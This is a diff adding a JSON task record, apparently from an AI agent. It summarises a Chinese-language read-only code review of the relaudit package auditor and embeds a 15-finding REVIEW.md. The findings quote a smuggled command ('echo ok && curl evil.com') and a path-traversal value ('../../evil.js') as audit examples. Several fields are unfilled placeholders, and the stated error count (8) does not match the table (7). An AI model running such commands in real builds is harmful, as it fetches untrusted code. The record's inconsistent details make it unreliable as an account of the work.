@@ -1,0 +1,49 @@
+{
+  "total": 5,
+  "sections": [
+    {
+      "summary": "对 relaudit 审计逻辑与前端正确性做上市前代码审查，只读审查 src/audit/、public/filter.js、public/format.js、src/render-panel.js，产出 REVIEW.md 共 15 条问题（8 error / 6 warn / 2 info），未改任何代码。",
+      "subtasks": [
+        {
+          "type": "plan",
+          "goal": "<objective>",
+          "refs": []
+        },
+        {
+          "type": "verify",
+          "command": "<command>",
+          "result": "<pass/fail>",
+          "refs": []
+        },
+        {
+          "type": "plan",
+          "goal": "<objective>",
+          "refs": []
+        },
+        {
+          "type": "impl",
+          "path": "REVIEW.md",
+          "change": "<one-line change>",
+          "refs": [
+            {
+              "refKey": "sub:3",
+              "path": "REVIEW.md",
+              "lineRange": "1-27",
+              "symbol": "relaudit",
+              "content": "# relaudit 上市前代码审查报告\n\n审查范围：`src/audit/`（R1–R7 规则实现）、`src/audit/index.js`（组装）、`public/filter.js`、`public/format.js`、`src/render-panel.js`。\n审查重点：审计逻辑正确性与前端正确性。未审查测试文件，未报告文档问题。\n\n| 编号 | 位置 | 损害 | 修复建议 | 严重度 |\n|------|------|------|----------|--------|\n| 1 | `src/audit/semver.js:16-22` `compareVersions` | 版本比较使用字典序字符串比较（`\"1.10.0\" < \"1.9.0\"` 被误判），导致 R1 版本门禁（必须严格大于最近发布版本）可被静默绕过或误报，错误/合规判定不可信。 | 改为按 `major/minor/patch/pre` 数值段比较（可复用 `parseVersion` 的解析结果），并正确处理 pre-release 排序。 | error |\n| 2 | `src/audit/tarball.js:32,37` `listTarballEntries` | 忽略 ustar `prefix` 字段（offset 345），长路径被截断为仅 basename。R2 因此无法识别深层未声明文件，审计器对“产物中混入未声明文件”完全失明。 | 重建完整路径：`prefix === '' ? name : prefix + '/' + name`，再交给 `isDeclared` 判定。 | error |\n| 3 | `src/audit/files.js:20,22` `checkLib` | 缺少 `main` 的目录包含性（containment）检查，指向包外的 `main`（如 `../../evil.js`）会通过审计，存在路径穿越/任意文件包含风险。 | 在 `path.resolve` 后增加 `!resolved.startsWith(path.resolve(pkgDir))` 判定并报告 R3。 | error |\n| 4 | `src/audit/sandbox.js:12-13` `ALLOWED_COMMANDS` | 白名单包含 `npx` 与 `curl`，构建脚本可借此从网络拉取代码，直接破坏受限发布沙箱的安全前提。 | 从白名单移除 `npx`/`curl`；如确需，改为显式、可审计的允许清单并禁止任意 URL 抓取。 | error |\n| 5 | `src/audit/sandbox.js:34` `checkBuildScript` | 仅校验每行第一个 token（`first`），`&&` / `\\|` / `;` 之后的命令不被检查。例如 `echo ok && curl evil.com` 因首词 `echo` 合法而整体放行。 | 按 shell 复合分隔符拆分每行，对每段的首命令逐一做白名单校验。 | warn |\n| 6 | `src/audit/deps.js:15` `checkDeps` | 将 `devDependencies` 合并进运行时依赖集合，导致仅存在于 dev 的依赖若未出现在构建产物清单中，被误报为“运行时缺失”。 | 仅遍历 `pkg.dependencies`（保留 `link:` 处理），dev 依赖不进入运行时缺失判定。 | warn |\n| 7 | `src/audit/changelog.js:32,36` `checkChangelog` | 日期仅做正则形状校验，未做月份/日范围校验，非法日期（如 `2026-13-05`、`2025-02-30`）通过审计。 | 调用已存在的 `isValidDate(year, month, day)` 做范围校验。 | warn |\n| 8 | `src/audit/changelog.js:9,38-39` `checkChangelog` | `ENTRY_RE` 允许无方括号条目（`## 1.3.0 - date`），但节区检查用 `raw.indexOf('[1.3.0]')` 定位，无括号条目 `at === -1` 直接 `continue`，跳过 Added/Fixed/Changed 节区检查。 | 用正则匹配位置（而非括号化 marker）定位条目区间来校验节区，使有无括号行为一致。 | warn |\n| 9 | `src/audit/consistency.js:17` `checkConsistency` | 取 README 中**最后一个** `vX.Y.Z` token 而非顶部第一个，当下方 changelog 提到当前版本时，顶部过期的版本徽章被漏检。 | 改为 `tokens[0][0].slice(1)`（取首个 token）。 | warn |\n| 10 | `src/audit/severity.js:12` `RULE_SEVERITY` | R1（版本门禁不匹配）被映射为 `warn` 而非 `error`，使关键合规问题在按严重度排序的报告中沉底。 | 将 `R1: 'warn'` 改为 `R1: 'error'`。 | error |\n| 11 | `src/audit/severity.js:14-21` `severityOf` | 未知规则回退为 `info`，新增规则（如 R8/R9）会被静默降级，在排序报告中沉底，难以发现。 | 对未知 `ruleId` 显式报错或默认 `error`，避免静默降级。 | info |\n| 12 | `src/audit/index.js:58-59` `runAudit` | `sortFindings` 在严重度尚未赋值（严重度在下一行 `decorated` 中才由 `severityOf` 计算）时被调用，导致按严重度排序实际为 no-op，报告仅按规则代码排序，与 `severity.js` 文档“error>warn>info”不符。 | 先 `decorated` 再对带 `severity` 的结果调用 `sortFindings`，或将 `severity` 传入排序键。 | warn |\n| 13 | `src/audit/index.js:29` `runAudit` | tarball 路径硬编码为 `relaudit-plugin-1.3.0.tgz`，审计任意其它版本时找不到产物，误报“产物 tarball 为空或不可解析”。 | 依据 `pkg.name`/`pkg.version` 动态拼接产物文件名，或强制要求 `opts.tarballPath`。 | info |\n| 14 | `public/filter.js:12` `applyFilter` | 过滤使用严格 `>` 而非 `>=`，当用户选择 `minSeverity` 为该级别时，恰好等于该级别的行被全部丢弃（选 `warn` 会丢失所有 warn 行）。 | 改为 `>= min`。 | error |\n| 15 | `public/format.js:10` `countTotal` | 先字符串拼接 `Number(String(errors) + String(warns))` 再 `+ infos`：2 错误 + 1 警告 + 4 提示 会算成 `21 + 4 = 25` 而非 7，前端汇总总数错误。 | 改为 `counts.errors + counts.warns + counts.infos`。 | error |\n\n## 说明\n- 编号 1–4、10、14、15 为会导致**错误放行/错误展示**的高危问题（error）；编号 5–9、12 为导致**漏检或误报**的中危问题（warn）；编号 11、13 为可维护性/健壮性隐患（info）。\n- `src/render-panel.js` 经审查未发现逻辑缺陷（`escapeHtml` 转义、summary 键名 `errors/warns/infos` 与 `summarize` 输出一致、行渲染正确），未列入上表。\n- 上述均为只读审查结论，未修改任何代码/测试/数据文件。"
+            }
+          ]
+        },
+        {
+          "type": "wrap",
+          "conclusion": "<conclusion>",
+          "refs": []
+        }
+      ]
+    }
+  ],
+  "retain": {
+    "refs": [],
+    "outline": "发布前审查完成，仅写 REVIEW.md，报告 15 条问题，未运行测试（无代码变更）。"
+  }
+}
